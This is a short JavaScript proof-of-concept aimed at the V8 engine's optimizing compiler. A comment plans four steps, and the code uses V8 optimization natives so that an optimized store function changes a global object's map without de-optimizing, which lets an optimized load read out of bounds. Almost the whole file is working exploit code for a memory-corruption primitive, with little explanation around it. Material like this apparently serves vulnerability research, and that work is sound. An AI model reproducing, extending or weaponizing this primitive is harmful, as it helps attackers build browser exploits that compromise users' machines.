/*
plan:
1. get store to optimize based on unstable map & ConstantType
2. get load to optimize by 'MapB' type
3. use optimized 'store' to implicit change 'x' map's
4. use optimized 'load' to get OOB read
*/

// primitive: able to change objects map without de-optimizing

var x = {a: 1};  // MapA
var x1 = {a: 2}; // MapA
var x2 = {a: 3}; // MapA
var x3 = {a: 4}; // MapA

function store(y) {
  x = y;
}

function load() {
  return x.b;
}


// store(x1);
%PrepareFunctionForOptimization(store);
store(x2); // theres a difference between store(x2) -> works and store(x1) -> doesn't work

%OptimizeFunctionOnNextCall(store);

x1.b = 1;

// store will optimized by 'x' having unstable map -> wont 'depend' on stability
store(x2);

// we won't de-opt
x.b = 1;

%PrepareFunctionForOptimization(load);
load(x);

%OptimizeFunctionOnNextCall(load);


// load will be optimized by 'x' having MapB
load(x);

// change 'x' map
store(x3);

// read oob
console.log(load());
